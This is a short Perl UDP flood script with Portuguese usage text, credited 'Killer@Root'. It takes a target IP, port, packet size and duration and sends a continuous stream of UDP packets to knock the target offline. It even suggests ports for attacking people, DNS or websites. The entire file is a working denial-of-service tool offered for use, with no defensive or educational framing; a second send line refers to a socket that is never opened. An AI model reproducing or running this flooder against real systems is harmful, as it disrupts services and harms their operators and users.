 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
#!/usr/bin/perl
#Feito por Killer@Root (system.pl)
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "system.pl <IP> <Porta> <Pacotes> <Tempo>\n\n";
  print " Porta = 80 Para Pessoas ou Porta 53 Para DNS Ou 8090 Para Site\n";
  print " Pacotes = 0: Usar entre 64 e 90000 Pacotes aleatorios\n";
  print " Tempo = 0: Ataque continuo\n";
  print " Feito = Killer@Root\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "IP inválido: $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 19);

 
print "Destribuindo Pacotes ao IP ou DNS e Porta $ip " . ($port ? $port : "random") . " com " . 
  ($size ? "$size-bytes" : "random size") . " de pacotes" . 
  ($time ? " por $time segundos" : "") . "\n";
print "Pare o ataque pressionando Ctrl + C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  send(aflood, pack("a$psize","aflood"), 0, pack_sockaddr_in($pport, $iaddr));}
